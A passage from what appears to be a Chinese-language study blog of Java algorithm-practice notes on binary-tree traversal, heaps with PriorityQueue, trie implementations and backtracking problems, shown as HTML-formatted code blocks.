class="line">完美二叉树，除了叶子结点之外的每一个结点都有两个孩子，每一层(当然包含最后一层)都被完全填充，是完全二叉树的特例；</span><br><span class="line">二叉搜索树，左子节点总是小于或等于根节点，而右子节点总是大于或等于根节点；<span class="comment">//整个左子树小于根节点，而不单是左子节点小于</span></span><br><span class="line">平衡二叉树，二叉搜索树的特例，还需满足：a.左子树和右子树的高度之差的绝对值小于等于<span class="number">1</span>；b.左子树和右子树也是平衡二叉树；是为了避免二叉搜索树高度过高，使其查找、增加和删除的时间复杂度从O(h)退化到O(n)而存在；</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>DFS的代码都很短，但是想到却很困难。对于root节点到叶子节点的全部路径，或者从任意节点开始的部分路径，dfs怎样操作子节点还是不能轻松想到。再次遇到求部分和次数的题目，看来子数组、子串、子路径都要记住hashMap前缀和的方法。呜呜呜呜....</span><br><span class="line"><span class="number">3.</span>目前遇到的习题，二叉树章节基本考察dfs，队列章节则基本考察bfs。二叉树章节的前几道题，都是dfs的奇思妙想，但本章比较基础也比较关键的是，通过dfs（递归）实现前序、中序和后序遍历，另外更困难的遍历实现是利用栈。</span><br><span class="line">    </span><br><span class="line"><span class="number">4.</span>二叉树前序、中序和后序遍历，栈解法：</span><br><span class="line">    a.中序遍历，双层<span class="keyword">while</span>循环，内部循环顺着左指针一直向下移动并压栈，弹栈时访问值并将当前节点指向右指针；外层循环判断当前节点是否为<span class="literal">null</span>或者栈是否为空，并以新节点接续顺着左指针压栈；实际就是每到右指针指向节点，又开始遍历其左子树；（关键词，双<span class="keyword">while</span>）</span><br><span class="line">    b.前序遍历，双层<span class="keyword">while</span>循环，和中序遍历一致，就是内层循环一直移动左指针时，就访问节点值；即假设对于最底层节点（没有右指针），中序是在弹栈弹掉最底层节点时访问它的值，再弹栈其上层根节点并访问；前序是现在压栈时访问其上层根节点，再压栈并访问最底层节点，弹栈时不访问，因此根节点最先被访问到；（关键词，双<span class="keyword">while</span>、压栈时访问）</span><br><span class="line">    c.后序遍历，双层<span class="keyword">while</span>循环，和中序遍历一致，就是维护指针prev指向上一次访问的节点，帮助弹栈时做判断。</span><br><span class="line">      弹栈时（其实是peek栈顶，这里说弹栈指对应中序遍历的代码块），</span><br><span class="line">    如果当前节点cur右指针不为<span class="literal">null</span>且没有指向prev，说明还没有访问cur右子树，将cur指向cur.right进行循环，此时不弹栈；</span><br><span class="line">    其他情况下是经典操作，直接弹栈并访问弹出节点，将prev指针指向弹出节点做记录，将cur指向<span class="literal">null</span>，等待下次循环栈顶复制；</span><br><span class="line">（关键词，双<span class="keyword">while</span>，弹栈时判断右指针是否指向上一次cur）</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>Java根据红黑树这种平衡的二叉搜索树实现TreeSet和TreeMap两种数据结构，其查找、添加和删除操作的时间复杂度都是O(logn)；TreeSet常用api：</span><br><span class="line">    ceilling  <span class="comment">//返回键大于或等于给定值的最小键，没有则返回null；</span></span><br><span class="line">    floor  <span class="comment">//返回键小于或等于给定值的最大键，没有则返回null；</span></span><br><span class="line">    higher  <span class="comment">//返回键大于给定值的最小键，没有则返回null；</span></span><br><span class="line">    lower  <span class="comment">//返回键小于给定值的最大键，没有则返回null；</span></span><br><span class="line">TreeMap常用api和TreeSet一致，只是在方法名后加Entry或者Key表示返回键值对还是键，比较的时候都是比较键；</span><br><span class="line">如果题目出现数据集合是动态的，并需要根据数据的大小实现快速查找，则使用TreeSet或TreeMap。HashMap做不到这一点，是因为其只能判断某键是否存在，并不能有“比某键大的所有数字中最小的那一个”这种功能。</span><br><span class="line">    </span><br><span class="line"><span class="number">6.</span>TreeSet和TreeMap使用起来很简单，遇到的题目，解题都是依次调用一遍floor和ceiling做判断，再put本元素即可。    </span><br><span class="line"><span class="number">7.</span>HashMap和TreeMap是同级的，都继承AbstractMap。必须TreeMap&lt;Integer,Integer&gt; treeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();，如果前面Class为Map&lt;Integer,Integer&gt;，则会因为多态而失去TreeMap的方法。</span><br></pre></td></tr></table></figure><h2 id="第九章、堆"><a href="#第九章、堆" class="headerlink" title="第九章、堆"></a>第九章、堆</h2><h3 id="059、数据流的第K大数值（703、9月16日）"><a href="#059、数据流的第K大数值（703、9月16日）" class="headerlink" title="059、数据流的第K大数值（703、9月16日）"></a>059、数据流的第K大数值（703、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，暴力破解。维护一个List存放数字，每次添加元素时，使用官方api进行逆序排列，再根据k索引到目标值。（关键词，集合api）</span><br><span class="line">Collections.sort(list, Comparator.reverseOrder());</span><br><span class="line"><span class="number">2.</span>Arrays.sort是数组排序，Collections.sort是集合排序，都可以传入Comparator接口的实现类，实现自定义排序。自定义排序这块还是不太熟悉，PriorityQueue、上面的逆排序都需要自定义排序比较器，后面需要掌握。</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，最小堆。维护一个PriorityQueue，其默认是最小堆，堆顶是整个堆的最小值，这个堆的目的是保存数组中前k大的数字。设计add函数时，按如下逻辑。因为只维护了PriorityQueue，空间复杂度为O(k)。（关键词，前k大元素的最小堆）</span><br><span class="line">a.如果当前堆大小小于k，直接将数字添加到堆;</span><br><span class="line">b.如果当前堆大小大于等于k，且要添加的数字超过堆顶，删除堆顶，并将新数字放入PriorityQueue，否则无视新数字；</span><br><span class="line">c.这样每次返回堆顶，堆顶是前k大数字中的最小值，即为第k大的数字；</span><br><span class="line"> <span class="number">4.</span>最小堆常求前k大元素，最大堆常求前k小元素，是反的。</span><br></pre></td></tr></table></figure><h3 id="060、出现频率最高的k个数字（347、9月16日）"><a href="#060、出现频率最高的k个数字（347、9月16日）" class="headerlink" title="060、出现频率最高的k个数字（347、9月16日）"></a>060、出现频率最高的k个数字（347、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，最小堆。先遍历一遍，将数字和出现次数放入hashMap；再遍历hashMap，按照上一题的方式，不满时放入最小堆，满时比较堆顶元素决定是否删除堆顶并放入。但是，这么做出现了问题，因为放入堆时会根据数字大小构造最小堆，而不是数字频率。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，最小堆。维护一个PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt;，构造函数传入的Comparator用键的值比较。</span><br><span class="line">    PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt; minHeap =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1.getValue()-e2.getValue());</span><br><span class="line">这里用了lambda表达式。（关键词，最小堆放entry）</span><br></pre></td></tr></table></figure><h3 id="061、和最小的k个数对（373、9月16日）"><a href="#061、和最小的k个数对（373、9月16日）" class="headerlink" title="061、和最小的k个数对（373、9月16日）"></a>061、和最小的k个数对（373、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，最大堆。维护一个PriorityQueue&lt;<span class="type">int</span>[]&gt;，自定义Comparator如下：</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;(e2[<span class="number">0</span>]+e2[<span class="number">1</span>])-(e1[<span class="number">0</span>]+e1[<span class="number">1</span>]));</span><br><span class="line">两层<span class="keyword">for</span>循环遍历两个数组，按照上一题的方式，不满时放入最大堆，满时比较堆顶元素决定是否删除堆顶并放入。</span><br><span class="line">遍历完后，如果最大堆的大小小于k，则再两层<span class="keyword">for</span>循环遍历两个数组将所有结果放入返回值；否则将堆中结果放入返回值。</span><br><span class="line">（关键词，最大堆<span class="type">int</span>[]）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，我的想法优化。因为两个数组是递增排序的，双层<span class="keyword">for</span>循环时不必遍历全部元素，都只用遍历前k个：</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;Math.min(k,nums1.length);i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; Math.min(k,nums2.length); j++) &#123;</span><br><span class="line">  此外，可以用<span class="keyword">while</span>(!maxHeap.isEmpty())避免最大堆大小小于k，即双层<span class="keyword">for</span>的全部结果数目小于k的情况，不用额外再双<span class="keyword">for</span>原始数组。</span><br></pre></td></tr></table></figure><h3 id="总结之堆"><a href="#总结之堆" class="headerlink" title="总结之堆"></a>总结之堆</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>Arrays.sort是数组排序，Collections.sort是集合排序，都可以传入Comparator接口的实现类，实现自定义排序。自定义排序这块还是不太熟悉，PriorityQueue、上面的逆排序都需要自定义排序比较器，后面需要掌握。</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>堆分类定义（堆通常用完全二叉树实现，最大特点是最值位于堆顶）：</span><br><span class="line">    最大堆，每个节点的值总是大于或等于其任意子节点的值；在最大堆中，根节点就是整个堆的最大值；</span><br><span class="line">    最小堆，每个节点的值总是小于或等于其任意子节点的值；在最小堆中，根节点就是整个堆的最小值；</span><br><span class="line"><span class="number">3.</span>堆的经典面试题，就是求一个数据集合中值最大或最小的k个元素；如果面试题是求出一个动态集合中的最大值或最小值，考虑用堆。最小堆常求前k大元素，最大堆常求前k小元素，是反的。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>Java提供了PriorityQueue实现堆结构，默认情况下是一个最小堆，如果使用最大堆调用构造函数时就需要传入Comparator改变比较排序规则，其常用api：</span><br><span class="line">add(e)  <span class="comment">//插入新的元素，会抛出异常；而offer(e)等效但不抛异常，而是返回null</span></span><br><span class="line">remove  <span class="comment">//删除堆顶元素，会抛出异常；而poll等效但不抛出异常，而是返回null</span></span><br><span class="line">element <span class="comment">//返回堆顶元素，会抛出异常；而peek等效但不抛出异常</span></span><br><span class="line">    Java中PriorityQueue实现了Queue接口，但它并不是一个队列，不按照“先入先出”顺序删除元素；它本质是一个堆，每次调用remove或者poll都是删除堆顶元素。最大堆中每次删除值最大的元素，最小堆中每次删除值最小的元素。element和peek同理。</span><br><span class="line"><span class="number">5.</span>PriorityQueue中，使用lambda表达式自定义Comparator例子：</span><br><span class="line">   PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt; minHeap =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1.getValue()-e2.getValue()); </span><br></pre></td></tr></table></figure><h2 id="第十章、前缀树"><a href="#第十章、前缀树" class="headerlink" title="第十章、前缀树"></a>第十章、前缀树</h2><h3 id="062、实现前缀树（208、9月16日）"><a href="#062、实现前缀树（208、9月16日）" class="headerlink" title="062、实现前缀树（208、9月16日）"></a>062、实现前缀树（208、9月16日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，前缀树。定义前缀树节点时，可以将其children指针指向长度为<span class="number">26</span>的TrieNode数组，因为前缀树一般考察小写字母，此外，维护一个布尔标志位，表示路径截止到该字符是否为字符串。本题需要先定义静态前缀树节点类，在insert、search和startsWith方法实现时，根据children指针遍历路径时，记住根节点是空的，还有children数组中不为<span class="literal">null</span>的单元即代表有效字母即可。（关键词，定义TrieNode）</span><br></pre></td></tr></table></figure><h3 id="063、替换单词（648、9月17日）"><a href="#063、替换单词（648、9月17日）" class="headerlink" title="063、替换单词（648、9月17日）"></a>063、替换单词（648、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，前缀树。用前缀树解决问题分为两步，第一步是创建前缀树，第二步是在前缀树中查找。</span><br><span class="line">创建前缀树时，</span><br><span class="line">遍历前缀树，当children对应字母指针为<span class="literal">null</span>时，在该字母指针上添加新节点，遍历晚字符串将当前节点isWord标志位设置为<span class="literal">null</span>。注意，对于字典中的每个字符串，都是从root节点开始遍历前缀树，每到新字符串要将node指向root；</span><br><span class="line">在前缀树中查找时，通过StringBuilder累积路径，当isWord标志位为<span class="literal">true</span>说明是最短前缀，或者children对应字母指针为<span class="literal">null</span>说明不存在前缀，这时候跳出循环并根据条件返回。</span><br><span class="line">在主函数中，通过以下api分割和组合字符串：</span><br><span class="line"> String[] units = sentence.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> String.join(<span class="string">&quot; &quot;</span>,units);</span><br></pre></td></tr></table></figure><h3 id="064、神奇的字典（676、9月17日）"><a href="#064、神奇的字典（676、9月17日）" class="headerlink" title="064、神奇的字典（676、9月17日）"></a>064、神奇的字典（676、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，前缀树。创建前缀树逻辑如旧。在前缀树中查找时，显然是用递归。每次访问新的字母时，尝试当前节点的<span class="number">26</span>个children字母指针，并根据是否为当前字母，决定“已修改次数标志位”是否加<span class="number">1</span>，并继续递归。对于我目前水平来说，还是不熟悉dfs方法传参和返回值的设计：</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TrieNode root,String word,<span class="type">int</span> i,<span class="type">int</span> edit)</span>  <span class="comment">//传参新节点，word，当前字母位置，修改次数</span></span><br><span class="line">需要考虑的情况：</span><br><span class="line">    a.<span class="literal">false</span>边界：root为<span class="literal">null</span>，说明不存在该字母指针，即字典不存在该单词；</span><br><span class="line">    b.<span class="literal">true</span>边界：当前字母位置i走到尽头，root是单词，已经修改一次；</span><br><span class="line">    c.当前字母位置i没有走到尽头，且标志位修改小于等于<span class="number">1</span>次，继续递归；</span><br><span class="line">    d.方法边界：其他情况都返回<span class="literal">false</span>，<span class="literal">true</span>只有“<span class="literal">true</span>边界”那一种情况；</span><br><span class="line">    （关键词，dfs）</span><br></pre></td></tr></table></figure><h3 id="065、最短的单词编码（820、9月17日）"><a href="#065、最短的单词编码（820、9月17日）" class="headerlink" title="065、最短的单词编码（820、9月17日）"></a>065、最短的单词编码（820、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>题目解释，这道题是给出单词数组words，但希望换成字符串s表示，并且字符串尽可能短。要求words[i]在s中以#结束，故不能考虑前缀重合，这时候就需要把一些尾缀相同的words[i]联合起来，但是为了表明words[i]在s中的开始位置，就用indices[i]索引words[i]的开始位置。题目答案要给出最短的字符串s长度。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，前缀树。将words中的单词逆序生成前缀树，实际维护了后缀相同的单词，此时要查询生成最短字符串的长度。对字符串a和b来说，如果a恰被淹没在b的路径里，那么只需累加b的长度；如果a和b只是部分前缀重合，那么a和b的长度都需要累加，这样能发现，最短字符串即全部叶子节点到root节点的路径。由于只需要统计长度，那就递归即可。dfs函数的设计还是很巧妙：</span><br><span class="line">    a.先将标志位isLeaf设置为<span class="literal">true</span>；</span><br><span class="line">    b.遍历<span class="number">26</span>个字母指针，如果指针不指向<span class="literal">null</span>，继续递归，并把标志位修改为<span class="literal">false</span>；</span><br><span class="line">    c.继而判断标志位是否为<span class="literal">true</span>，如果为<span class="literal">true</span>说明没有修改，即children指针均指向<span class="literal">null</span>，是叶子节点，此时累加长度；</span><br><span class="line">    初始化length为<span class="number">1</span>，即root节点（空节点）为<span class="number">1</span>，第一个节点时length为<span class="number">2</span>，满足“第一个字母#”长度为<span class="number">2</span>的要求。（关键词，dfs）</span><br><span class="line"><span class="number">3.</span>前缀树中dfs用标志位判断是否为叶子节点，不用root==<span class="literal">null</span>，因为大多数children指针确实为<span class="literal">null</span>。</span><br></pre></td></tr></table></figure><h3 id="066、单词之和（677、9月17日）"><a href="#066、单词之和（677、9月17日）" class="headerlink" title="066、单词之和（677、9月17日）"></a>066、单词之和（677、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap+前缀树。维护一个HashMap&lt;String,Integer&gt;和一个前缀树。insert方法把新键值插入hashMap的同时，还要把新键加入到前缀树中。这里重点说sum方法，是我为数不多自己实现回溯：</span><br><span class="line">    先通过prefix字符串遍历到最后的节点，并将prefix加入StringBuilder，进入dfs函数：</span><br><span class="line">     dfs(TrieNode node,<span class="type">int</span>[] sum,StringBuilder builder,<span class="type">int</span> index)</span><br><span class="line">    a.遍历当前节点node的<span class="number">26</span>个字母指针，如果不为<span class="literal">null</span>，将builder增加当前字母，并放入dfs继续递归，传入下一层字符的索引值index+<span class="number">1</span>，回溯时再在builder中删除当前字母；注意index初始为prefix长度，而不是<span class="number">0</span>；</span><br><span class="line">    b.如果当前节点为单词，将builder转化为字符串，从hashMap中根据键取值，并累积到最终结果；（关键词，dfs+hashMap）</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，前缀树。相比我的想法改进在，如果一个节点对应一个字符串的最后一个字符，那么该节点的整数字段的值就设为字符串的值，否则设为<span class="number">0</span>；这时候需要修改TrieNode定义，不再需要<span class="type">boolean</span>标志位isWord，而是整数值value。</span><br></pre></td></tr></table></figure><h3 id="067、最大的异或（421、9月17日）"><a href="#067、最大的异或（421、9月17日）" class="headerlink" title="067、最大的异或（421、9月17日）"></a>067、最大的异或（421、9月17日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，暴力破解。双层<span class="keyword">for</span>循环遍历，Math.max(value,nums[i]^nums[j])，然而超时了。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，前缀树。因为对于整数异或位运算，相异为<span class="number">1</span>，相同为<span class="number">0</span>，为使结果数值更大，应该尽量高位为<span class="number">1</span>。故构建前缀树时，高位作为前缀。遍历nums整数数组时，从高位开始遍历当前数字num的<span class="number">32</span>位，看前缀树是否有与当前位不同的位，</span><br><span class="line">    a.如果有则将node节点优先移动到该位，并将结果的该位置为<span class="number">1</span>；  xor = (xor&lt;&lt;<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">    b.没有则移动到相同位，并将结果的该位置为<span class="number">0</span>；  xor = xor&lt;&lt;<span class="number">1</span>;</span><br><span class="line">当前数字num按位访问结束后，通过Math.max(max,xor)更新结果值。（关键词，高位前缀树取不同）</span><br><span class="line">        </span><br><span class="line"><span class="number">3.</span>回忆整数章节技巧：</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">31</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> (num&gt;&gt;i)&amp;<span class="number">1</span>;   <span class="comment">//从32位整数高位开始，右移i位，每次只保留末尾位</span></span><br></pre></td></tr></table></figure><h3 id="总结之前缀树"><a href="#总结之前缀树" class="headerlink" title="总结之前缀树"></a>总结之前缀树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>前缀树定义：</span><br><span class="line">前缀树是一棵多叉树，一个节点可能有多个子节点。前缀树中除根节点外，每个节点表示字符串中的一个字符，而字符串由前缀树的路径表示。例如，“can”和“cat”前两个字符相同，它们在前缀树对应的两条路径中最开始的<span class="number">3</span>个节点重叠（根节点，<span class="string">&#x27;c&#x27;</span>和<span class="string">&#x27;a&#x27;</span>）。</span><br><span class="line"><span class="number">2.</span>前缀树主要用来解决字符串查找相关的问题，一般题目要求根据字符串的前缀进行查找。用前缀树解决问题分为两步，第一步是创建前缀树，第二步是在前缀树中查找。这部分需要熟练TrieNode节点定义、创建前缀树经典代码这<span class="number">2</span>步惯性操作，查找通常用dfs比较多样。</span><br><span class="line"><span class="number">3.</span>可以按需求修改TrieNode定义，比如增加字段<span class="type">int</span> value，记录单词对应的值。</span><br><span class="line">    </span><br><span class="line"><span class="number">4.</span>越来越觉得，递归、回溯以及dfs方法要从四个方向考虑：<span class="literal">false</span>边界、<span class="literal">true</span>边界、继续递归条件和方法边界，而传参和返回值看代码需要什么，是后面才补充的。这部分还是不太熟练。</span><br><span class="line"><span class="number">5.</span>前缀树中dfs用标志位判断是否为叶子节点，不用root==<span class="literal">null</span>，因为大多数children指针确实为<span class="literal">null</span>。</span><br></pre></td></tr></table></figure><h2 id="第十三章、回溯法"><a href="#第十三章、回溯法" class="headerlink" title="第十三章、回溯法"></a>第十三章、回溯法</h2><h3 id="079、所有子集（78、9月18日）"><a href="#079、所有子集（78、9月18日）" class="headerlink" title="079、所有子集（78、9月18日）"></a>079、所有子集（78、9月18日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。从左到右遍历整数数组nums，用subSet记录当前集合。遍历到每个元素时，可以选择不放入当前元素继续递归；或者将当前元素放入subSet后继续递归，递归结束将元素从当前集合删除。当遍历深度达到数组长度，则将subSet纳入结果。这道题需要注意：</span><br><span class="line">a.使用LinkedList，在删除元素时用removeLast方法；而不是使用List，删除元素时用remove(index)。这是因为，假设当前index为<span class="number">2</span>，subSet=[<span class="number">3</span>]，即前两次加的都是空，这样remove(<span class="number">2</span>)时就会越界，为了恢复状态应该用removeLast方法；</span><br><span class="line">b.双层List嵌套结果，需要用下面的方式放入结果。如果直接result.add(subSet)，后面再操作subSet时，会改变result中subSet值：</span><br><span class="line">result.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line">（关键词，回溯经典）</span><br></pre></td></tr></table></figure><h3 id="080、含有k个元素的组合（77、9月18日）"><a href="#080、含有k个元素的组合（77、9月18日）" class="headerlink" title="080、含有k个元素的组合（77、9月18日）"></a>080、含有k个元素的组合（77、9月18日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。显然不能穷举，k为多少就设多少层循环，应该传index回溯。这道题和上一道逻辑相同，因为需要提取k个数，所以外界判断subSet是否到达k，达到则纳入结果；当没有到达k时，有两种选择，可以选择不放入当前元素继续递归，给其他元素一个机会；或者将当前元素放入subSet后继续递归，递归结束将元素从当前集合删除。需注意当前元素不可越界，越界后会走不到判断逻辑并返回，不会继续越界。</span><br><span class="line">     <span class="keyword">if</span>(subSet.size()==k)&#123;</span><br><span class="line">            results.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(subSet));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(start&lt;=n)&#123;</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                </span><br><span class="line">                subSet.add(start);</span><br><span class="line">                dfs(n,k,start+<span class="number">1</span>,subSet,results);</span><br><span class="line">                subSet.removeLast();</span><br><span class="line">            &#125;</span><br><span class="line">     &#125;</span><br><span class="line">（关键词，回溯经典）</span><br></pre></td></tr></table></figure><h3 id="081、允许重复选择元素的组合（39、9月19日）"><a href="#081、允许重复选择元素的组合（39、9月19日）" class="headerlink" title="081、允许重复选择元素的组合（39、9月19日）"></a>081、允许重复选择元素的组合（39、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。做完前几道有点进步了，按照惯性思路完成本题。dfs函数设计如下，index用于定位当前数字，sum是当前累积和，subSet是本集合，results是最终结果集合。</span><br><span class="line">dfs(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> index, <span class="type">int</span>[] sum, LinkedList&lt;Integer&gt; subSet,List&lt;List&lt;Integer&gt;&gt; results)</span><br><span class="line">dfs逻辑为，当前累计和sum小于target时，有两种选择：</span><br><span class="line">    a.index加一，不访问本索引数字，直接递进下个数字的dfs；</span><br><span class="line">    b.subSet和sum都累加本索引数字，index不变进入下一轮dfs，dfs结束后subSet和sum恢复原状，这样涵盖了多次使用一个数字的情况；</span><br><span class="line">当前累积和sum等于target时，将本集合subSet纳入结果；超过target则没有逻辑自动返回；</span><br><span class="line">（关键词，重复不加）</span><br></pre></td></tr></table></figure><h3 id="082、含有重复元素集合的组合（40、9月19日）"><a href="#082、含有重复元素集合的组合（40、9月19日）" class="headerlink" title="082、含有重复元素集合的组合（40、9月19日）"></a>082、含有重复元素集合的组合（40、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。经过题解点拨，“避免重复组合的方法是，当在某一步决定跳过某个值为m的数字时，跳过所有值为m的数字”。因此dfs逻辑为，当前累积和sun小于target时只有一种选择：</span><br><span class="line">subSet和sum都累加本索引数字，index加一，进入下一轮dfs，dfs结束后subSet和sum恢复原状，这样就不会使用某元素多次；</span><br><span class="line">但是，需要解决不同位置、值相同元素造成的结果重复。这时候，可以先通过Arrays.sort(candidates)排序初始数组，遍历到某数字时，如果下一数字等于本数字，就不断自增index直到不同的数字再dfs。（关键词，要跳全跳）</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>写完才发现完全依靠这句点拨，否则还是难想，辅以示例；比如原始数字集合candidates为[<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>]，某目标subSet为[<span class="number">2</span>,<span class="number">2</span>]，但会有<span class="number">3</span>种重复，用上面的逻辑，决定调<span class="number">2</span>时会跳出所有的<span class="number">2</span>，那么就会排除重复解：</span><br><span class="line">    a.跳过第一个<span class="number">2</span>，保留后两个<span class="number">2</span>；b.跳过中间的<span class="number">2</span>，保留前后的<span class="number">2</span>；</span><br><span class="line">这样，任何对<span class="number">2</span>的需求，都是取靠前位置的<span class="number">2</span>，靠后位置的<span class="number">2</span>不被选择故不会重复。</span><br></pre></td></tr></table></figure><h3 id="083、没有重复元素集合的全排列（46、9月19日）"><a href="#083、没有重复元素集合的全排列（46、9月19日）" class="headerlink" title="083、没有重复元素集合的全排列（46、9月19日）"></a>083、没有重复元素集合的全排列（46、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。题解的思路基于示例更好说明，假设输入集合[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]，对于第一个位置，这<span class="number">3</span>个数字都有可能；对于第二个位置，只有<span class="number">2</span>个数字有可能；第三个位置已经没得选择。dfs函数设计如下：</span><br><span class="line">    a.当索引i达到数组长度时，将当前数组转换为List并纳入结果；</span><br><span class="line">    b.当索引i还没有达到数组长度时，从i开始，后面的每个数字都可以与i位置数字交换，i自增后进入下一轮dfs，dfs结束后将i位置和j位置数字交换回来；</span><br><span class="line">这种思路，每次交换到前面的数字都不再被访问，随着i的增加后面位置情况减少。</span><br><span class="line">（关键词，回溯交换）</span><br></pre></td></tr></table></figure><h3 id="084、含有重复元素集合的全排列（47、9月19日）"><a href="#084、含有重复元素集合的全排列（47、9月19日）" class="headerlink" title="084、含有重复元素集合的全排列（47、9月19日）"></a>084、含有重复元素集合的全排列（47、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。当索引i还没有到达数组长度时，从i开始，后面的每个数字只有与位置i的数字不同，都可以与i位置数字交换，其他步骤同第<span class="number">83</span>题。但是，有很多测试用例没通过。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，回溯法。观察题解发现，这里不能只判断“后面的每个数字只有与位置i的数字不同”，还有如果某数字已经与位置i的数字交换，那么与其值相同的数字就不应该再与位置i的数字交换。比如数组[<span class="number">1</span>,<span class="number">2</span>,i=<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>]，这时候第二个<span class="number">3</span>不应该交换，第二个<span class="number">5</span>也不应该交换。</span><br><span class="line">（关键词，回溯交换+hashSet）</span><br></pre></td></tr></table></figure><h3 id="085、生成匹配的括号（22、9月19日）"><a href="#085、生成匹配的括号（22、9月19日）" class="headerlink" title="085、生成匹配的括号（22、9月19日）"></a>085、生成匹配的括号（22、9月19日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。这应该是第二次做这道题，虽然间隔很久，但是还是做出来了。思路就是，通过StringBuilder增加‘(’字符，进入下一轮dfs，dfs结束后将该字符从builder中移除，再同样操作‘)’字符。当递进深度达到<span class="number">2</span>*n时，判断字符串是否为有效括号，有效则纳入结果。</span><br><span class="line">    判断有效括号： ‘(’字符时压栈，‘)’字符时弹栈，弹栈时如果栈为空则<span class="literal">false</span>，全部字符遍历结束则返回<span class="literal">true</span>。</span><br><span class="line">但是，只击败了<span class="number">5</span>%的同学，肯定不是最优解了。  （关键词，先递进再判断）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，回溯法。相比我的优点是，不用专门判断括号是否有效。由于只存在圆括号“()”，那只需注意两点：</span><br><span class="line">    a.‘(’括号和‘)’括号，数目都不能超过n；</span><br><span class="line">    b.为满足括号匹配，任意时刻左括号数目 &gt;= 右括号数目；</span><br><span class="line">因此，当left&lt;n时，dfs进入left+<span class="number">1</span>；当left&gt;right时，dfs进入right+<span class="number">1</span>。  （关键词，left&gt;=n）</span><br></pre></td></tr></table></figure><h3 id="086、分割回文字符串（131、9月20日）"><a href="#086、分割回文字符串（131、9月20日）" class="headerlink" title="086、分割回文字符串（131、9月20日）"></a>086、分割回文字符串（131、9月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。从start开始遍历，如果从start开始到i结束(包括i)的字符串为回文字符串，那就通过s.substring(start,i+<span class="number">1</span>)把这段字符串切割出来，从(i+<span class="number">1</span>)进入下一轮dfs，dfs结束后将该段字符串删除。</span><br><span class="line"><span class="keyword">for</span>(<span 